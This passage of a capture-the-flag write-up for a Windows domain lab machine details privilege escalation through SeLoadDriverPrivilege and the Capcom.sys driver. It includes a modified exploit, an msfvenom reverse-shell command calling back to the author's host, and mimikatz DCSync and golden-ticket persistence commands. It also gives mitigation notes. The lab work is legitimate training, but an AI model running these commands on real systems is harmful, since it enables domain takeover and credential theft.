+<ul>
+<li>
+<p><strong>I connect to the host using</strong> <code>evil-winrm</code>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -p $pass</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I get the user flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-17-144831_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="finding-out-we-have-the-seloaddriverprivilege-privilege">Finding out we have the <code>SeLoadDriverPrivilege</code> privilege:</h3>
+<ul>
+<li><strong>I enumerate the privileges of my user</strong>:
+<ul>
+<li><code>whoami /priv</code></li>
+<li><figure><img src="/ox-hugo/2024-10-17-144928_.png">
+</figure>
+</li>
+<li>Checking my group memberships confirms this also:</li>
+<li><figure><img src="/ox-hugo/2024-10-17-151209_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>From previous experience I know this is a viable privilege escalation path using the <code>Capcom.sys</code> exploit.</li>
+</ul>
+<h3 id="checking-the-system-is-vulnerable-to-the-exploit">Checking the system is vulnerable to the exploit:</h3>
+<ul>
+<li>
+<p>The <code>Capcom.sys</code> attack only works if the Windows build is below build <code>17134</code>.</p>
+<ul>
+<li>But how do I know this? I will share how I know this information soon.</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the build</strong>:</p>
+<ul>
+<li><code>[System.Environment]::OSVersion.Version</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-173023_.png">
+</figure>
+</li>
+<li>It&rsquo;s <code>14393</code> so we can move forward with this attack.</li>
+</ul>
+</li>
+</ul>
+<h4 id="print-operators-group-explained"><code>Print Operators</code> Group Explained:</h4>
+<ul>
+<li>
+<p>Allowed local logon to DCs; can exploit Windows to load malicious drivers.</p>
+</li>
+<li>
+<p>Being part of the Print Operators Group grants users the <code>SeLoadDriverPrivilege</code></p>
+</li>
+<li>
+<p><strong>Print Operators Group Overview</strong>:</p>
+<ul>
+<li>Purpose: Provides management capabilities for printers connected to domain controllers and Active Directory printer objects within the domain.</li>
+</ul>
+</li>
+<li>
+<p><strong>Capabilities</strong>:</p>
+<ul>
+<li>Manage, create, share, and delete printers.</li>
+<li>Manage Active Directory printer objects.</li>
+<li>Locally sign in to and shut down domain controllers.</li>
+</ul>
+</li>
+<li>
+<p><strong>Caution and Restrictions</strong>:</p>
+<ul>
+<li>Member Caution: Due to the ability to load and unload device drivers on domain controllers, add members cautiously.</li>
+<li><strong>Restrictions</strong>:
+<ul>
+<li>Cannot be renamed, deleted, or removed.</li>
+<li>No default members.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Attributes and Permissions</strong>:</p>
+<ul>
+<li>Well-known SID/RID: <code>S-1-5-32-550</code></li>
+<li>Type: Builtin Local</li>
+<li>Default Container: <code>CN=Builtin, DC=[domain], DC=[domain]</code></li>
+<li>Protected by <code>AdminSDHolder</code>?: Yes</li>
+<li>Movement Restrictions: Cannot be moved out of the default container.</li>
+<li>Delegation: Not safe to delegate management to non-service admins.</li>
+<li>+Default+ User Rights.
+<ul>
+<li>Allow log on locally: <code>SeInteractiveLogonRight</code></li>
+<li>Load and unload device drivers: <code>SeLoadDriverPrivilege</code>
+<ul>
+<li>This is what we are mainly interested in as we can load a malicious driver.</li>
+</ul>
+</li>
+<li>Shut down the system: <code>SeShutdownPrivilege</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="seloaddriverprivilege-explained"><code>SeLoadDriverPrivilege</code> Explained:</h4>
+<ul>
+<li>Permits the dynamic loading and unloading of device drivers, which can be essential for system updates or configuration changes.
+<ul>
+<li>Being part of the <code>Print Operators Group</code> provides this privilege by default.</li>
+<li>There is a great article <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">here</a> about how it can be abused.</li>
+<li>We can take advantage of this privilege to exploit a well known vulnerable driver called <code>Capcom.sys</code> to run code as <code>SYSTEM</code>.</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-ownership">4. Ownership:</h2>
+<h3 id="capcom-dot-sys-driver-vulnerability-arbitrary-code-execution-with-system-privileges"><code>Capcom.sys</code> Driver Vulnerability: Arbitrary Code Execution with <code>SYSTEM</code> Privileges</h3>
+<ul>
+<li><strong>TL;DR</strong>: Key Takeaways</li>
+<li><code>Capcom.sys</code> is a vulnerable driver that allows attackers to execute arbitrary code with <code>SYSTEM</code> privileges.</li>
+<li>Protections like <code>VBS</code> and <code>HVCI</code> can help mitigate risks, but require modern hardware.</li>
+<li><code>Driver block rules</code>: can provide an additional layer of defense by preventing vulnerable drivers from loading.</li>
+</ul>
+<h4 id="overview-of-the-capcom-dot-sys-vulnerability">Overview of the <code>Capcom.sys</code> Vulnerability:</h4>
+<ul>
+<li>
+<p>The <code>Capcom.sys</code> kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.</p>
+</li>
+<li>
+<p>Specifically, this driver disables <code>SMEP</code> (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with <code>SYSTEM</code> privileges.</p>
+<ul>
+<li>You can find the real <code>Capcom.sys</code> driver on GitHub: <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">Capcom.sys driver on GitHub</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Affected Windows Versions</strong>:</p>
+<ul>
+<li>This exploit has been tested and verified on the following Windows versions:</li>
+<li>Windows 7 (x64)</li>
+<li>Windows 8.1 (x64)</li>
+<li>Windows 10 (x64) up to build <code>17134</code> (Version 1708)</li>
+<li>Windows 11 (x64) up to build <code>22000.194</code> (Version 21H2)
+<ul>
+<li>Builds after <code>22000.194</code> contain deny lists that prevent this driver from loading.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Security Considerations</strong>:
+<ul>
+<li>
+<p>Modern versions of Windows have introduced protections like <code>Virtualization-based Security (VBS)</code> and <code>Hypervisor-Protected Code Integrity (HVCI)</code> to mitigate the risks posed by vulnerable drivers such as <code>Capcom.sys</code>.</p>
+</li>
+<li>
+<p>These security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it’s important to note that these features often require newer hardware and can have a performance impact.</p>
+</li>
+<li>
+<p>For a deeper dive into the issue of signed vulnerable drivers, you can refer to:</p>
+<ul>
+<li><a href="https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/">WeLiveSecurity&rsquo;s article</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>Mitigation Strategies</strong>:</p>
+<ul>
+<li>To safeguard against vulnerabilities like this, Microsoft recommends implementing <code>driver block rules</code> as part of a comprehensive security policy.</li>
+<li>These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load.</li>
+</ul>
+</li>
+<li>
+<p>For more on how to implement and enforce these rules, check out:</p>
+<ul>
+<li><a href="https://redcanary.com/blog/ms-driver-block-rules/">Red Canary’s guide on driver block rules</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="download-a-copy-of-the-official-capcom-dot-sys-driver">Download A Copy of the official <code>Capcom.sys</code> Driver:</h3>
+<ul>
+<li><strong>Download the official driver</strong>:
+<ul>
+<li><code>wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys</code>
+<ul>
+<li>We will keep it locally at the moment as there are some other tools we need to compile before we can move forward.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="compiling-the-eoploaddriver-tool-to-enable-us-to-load-the-capcom-dot-sys-driver">Compiling the <code>EopLoadDriver</code> tool to enable us to load the <code>Capcom.sys</code> driver:</h3>
+<h4 id="preparing-the-eoploaddriver-c-plus-plus-project">Preparing the <code>EopLoadDriver ~C++</code> Project:</h4>
+<ul>
+<li>
+<p><strong>This is a</strong> <code>C++</code> <strong>file that will need to be compiled within</strong> <code>Visual Studio</code> <strong>so I will spin up my</strong> <code>Windows VM</code></p>
+<ul>
+<li>I download the project:
+<ul>
+<li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">https://github.com/TarlogicSecurity/EoPLoadDriver/</a></li>
+</ul>
+</li>
+<li>I create a new project:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-071257_.png">
+</figure>
+</li>
+<li>Then type <code>Console</code> into the search bar &amp; select <code>ConsolApp</code> with <code>C++</code> written below it.</li>
+<li>Click <code>Next</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I give it a name &amp; also select</strong>: <code>Place solution and project in the same directory</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-071638_.png">
+</figure>
+</li>
+<li><strong>Hit</strong> <code>&quot;Create&quot;</code></li>
+<li>+Note+:
+<ul>
+<li>Just incase you are unaware, this just puts source code &amp; project itself in the same directory is all.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>This provides a standard</strong> <code>Hello World</code> <strong>template, which we can use as the basis of our project</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-072018_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="importing-the-eoploaddriver-code-and-compiling">Importing the <code>EopLoadDriver</code> code &amp; Compiling:</h4>
+<ul>
+<li>
+<p><strong>I delete all the code on the</strong> <code>Hello World</code> <strong>generated file &amp; paste in the contents of</strong> <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">Targlogic&rsquo;s</a> <code>EopLoadDriver</code> <strong>code</strong>:</p>
+<ul>
+<li><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a></li>
+</ul>
+</li>
+<li>
+<p><strong>I set it to release &amp; then press build but get errors relating to</strong> <code>stdafx.h</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-072232_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I do some searching online &amp; find this</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-072621_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>So my imports look like this now</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-181622_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I re-run the build and it builds successfully</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-072752_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="compiling-the-exploitcapcom-exploit-c-plus-plus-project">Compiling the <code>ExploitCapcom</code> exploit <code>C++</code> project:</h3>
+<ul>
+<li>We are going to be using the <a href="https://github.com/tandasat/ExploitCapcom/tree/master">ExploitCapcom</a> tool. We will need to compile this ourselves.</li>
+</ul>
+<h4 id="importing-the-exploitcapcom-c-plus-plus-project">Importing the <code>ExploitCapcom C++</code> Project:</h4>
+<ul>
+<li>
+<p><strong>This time I am going to clone this repo</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-111819_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Paste in the repo url</strong>:</p>
+<ul>
+<li><a href="https://github.com/tandasat/ExploitCapcom.git">https://github.com/tandasat/ExploitCapcom.git</a></li>
+<li><figure><img src="/ox-hugo/2024-10-18-111850_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="modifying-exploitcapcom-exploit-to-enable-a-reverse-shell">Modifying <code>ExploitCapcom</code> exploit to enable a reverse shell:</h3>
+<ul>
+<li>
+<p><strong>I open</strong> <code>ExploitCapcom.cpp</code> <strong>and do not remove the</strong> <code>stdafx.h</code> <strong>import</strong>:</p>
+<ul>
+<li>The reason being is the actual required file containing the header is in this project. So we can compile with it.
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-125040_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>This exploit by default opens a new elevated shell, however this requires we have</strong> <code>GUI</code> <strong>access. So we will need to modify to run a reverse shell</strong>:</p>
+<ul>
+<li>
+<p>Below is the code we are going to modify:</p>
+<ul>
+<li><code>TCHAR CommandLine[] = TEXT(&quot;C:\\Windows\\system32\\cmd.exe&quot;);</code></li>
+</ul>
+</li>
+<li>
+<p>I will modify it to run a reverse shell generated via <code>msfvenom</code>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20//%20Launches%20a%20command%20shell%20process%0a%20%20static%20bool%20LaunchShell%28%29%0a%20%20%7b%0a%20%20%20%20%20%20//Original%20Line%20Commented%20Out:%0a%20%20%20%20%20%20//TCHAR%20CommandLine[]%20=%20TEXT%28%22C:%5c%5cWindows%5c%5csystem32%5c%5ccmd.exe%22%29;%0a%20%20%20%20%20%20TCHAR%20CommandLine[]%20=%20TEXT%28%22C:%5c%5cUsers%5c%5csvc-print%5c%5cDocuments%5c%5cshell.exe%22%29;%0a%20%20%20%20%20%20PROCESS_INFORMATION%20ProcessInfo;%0a%20%20%20%20%20%20STARTUPINFO%20StartupInfo%20=%20%7b%20sizeof%28StartupInfo%29%20%7d;%0a%20%20%20%20%20%20if%20%28!CreateProcess%28CommandLine,%20CommandLine,%20nullptr,%20nullptr,%20FALSE,%0a%20%20%20%20%20%20%20%20%20%20CREATE_NEW_CONSOLE,%20nullptr,%20nullptr,%20&amp;StartupInfo,%0a%20%20%20%20%20%20%20%20%20%20&amp;ProcessInfo%29%29%0a%20%20%20%20%20%20%7b%0a%20%20%20%20%20%20%20%20%20%20return%20false;%0a%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20CloseHandle%28ProcessInfo.hThread%29;%0a%20%20%20%20%20%20CloseHandle%28ProcessInfo.hProcess%29;%0a%20%20%20%20%20%20return%20true;%0a%20%20%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>  <span style="color:#75715e">// Launches a command shell process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">LaunchShell</span>()
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//Original Line Commented Out:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">//TCHAR CommandLine[] = TEXT(&#34;C:\\Windows\\system32\\cmd.exe&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      TCHAR CommandLine[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">svc-print</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Documents</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">shell.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>      PROCESS_INFORMATION ProcessInfo;
+</span></span><span style="display:flex;"><span>      STARTUPINFO StartupInfo <span style="color:#f92672">=</span> { <span style="color:#66d9ef">sizeof</span>(StartupInfo) };
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CreateProcess(CommandLine, CommandLine, <span style="color:#66d9ef">nullptr</span>, <span style="color:#66d9ef">nullptr</span>, FALSE,
+</span></span><span style="display:flex;"><span>          CREATE_NEW_CONSOLE, <span style="color:#66d9ef">nullptr</span>, <span style="color:#66d9ef">nullptr</span>, <span style="color:#f92672">&amp;</span>StartupInfo,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&amp;</span>ProcessInfo))
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      CloseHandle(ProcessInfo.hThread);
+</span></span><span style="display:flex;"><span>      CloseHandle(ProcessInfo.hProcess);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Full transparency, I tried multiple different payloads. My original plan was to upload <code>nc64.exe</code> but it just would not execute not matter the subshells etc I used.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I compile it</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-125121_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="generating-our-reverse-shell-payload-using-msfvenom">Generating our reverse-shell payload using <code>msfvenom</code>:</h3>
+<ul>
+<li><strong>I generate a simple reverse shell using</strong> <code>msfvenom</code>:
+<ul>
+<li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=443 -f exe -o shell.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-143546_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="run-the-exploit-chain-on-the-victim">Run the exploit chain on the victim:</h3>
+<ol>
+<li>
+<p><strong>I use</strong> <code>evil-winrm</code> <strong>to transfer all the files to the target</strong>:</p>
+<ul>
+<li><code>upload [filename]</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-130359_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Load the driver Run Exploit</strong>:</p>
+<ul>
+<li><code>.\EopLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\svc-print\Documents\Capcom.sys</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-130552_.png">
+</figure>
+</li>
+<li>All 0&rsquo;s is good as a response, means we are wroking.</li>
+</ul>
+</li>
+<li>
+<p><strong>Setup Listener</strong>:</p>
+<ul>
+<li><code>rlwrap -cAr nc -lnvp 443</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Trigger exploit</strong>:</p>
+<ul>
+<li><code>.\ExploitCapcom.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-143703_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Catch the reverse shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-143802_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Get our root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-144054_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="5-dot-persistence">5. Persistence:</h2>
+<h3 id="creating-a-golden-ticket-with-mimikatz">Creating a Golden Ticket with <code>mimikatz</code>:</h3>
+<ul>
+<li>
+<p><strong>I transfer</strong> <code>mimikatz.exe</code> <strong>over using my existing</strong> <code>evil-winrm</code> <strong>session</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-145858_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I perform a</strong> <code>DCsync</code> <strong>attack to retrieve the</strong> <code>krbtgt NTLM hash</code>:</p>
+<ul>
+<li><code>lsadump::dcsync /user:krbtgt /domain:fabricorp.local</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-145454_.png">
+</figure>
+</li>
+<li>I also retrieve the domain <code>SID</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I create my golden ticket using</strong> <code>mimikatz</code> <strong>&amp; the</strong> <code>krbtgt</code> <strong>hash to make myself a 10 year ticket</strong>:</p>
+<ul>
+<li><code>kerberos::golden /domain:fabricorp.local /user:Administrator /sid:S-1-5-21-2633719317-1471316042-3957863514 /rc4:8ee7[REDACTED]87b0</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-150330_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I transfer the ticket back myself using</strong> <code>evil-winrm</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-18-145847_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I convert the ticket so I can use it locally on linux</strong>:</p>
+<ul>
+<li><code>impacket-ticketConverter ticket.kirbi admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-145921_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I sync my clock with the target</strong>:</p>
+<ul>
+<li><code>sudo ntpdate -s fuse.$domain</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-145936_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I load the ticket into the</strong> <code>KRB5CCNAME</code> <strong>variable</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-145947_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I verify it works using a</strong> <code>psexec</code> <strong>session</strong>:</p>
+<ul>
+<li><code>impacket-psexec fuse.$domain -k</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-145959_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="full-dcsync-attack-using-netexec-and-golden-ticket">Full DCSync attack using <code>netexec</code> and Golden Ticket:</h3>
+<ul>
+<li><strong>Now that we have our Golden ticket we can use it to perform a DCSync attack and extract all the hashes</strong>:
+<ul>
+<li><code>netexec smb $box --use-kcache -M ntdsutil</code></li>
+<li><figure><img src="/ox-hugo/2024-10-18-150059_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>
+<p>I learned that trying to get all your enumeration done very quickly before the password is reset can be frustrating.</p>
+</li>
+<li>
+<p>I learned that people will always use the description field to hold important information.</p>
+</li>
+<li>
+<p>I learned that the exploit really did not want to execute the nc64.exe binary no matter how hard I tried. However I think I may have a record for speed-running compiling exploits.</p>
+</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Had to revert the machine and forgot the hosts.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3764
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Oct 18 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
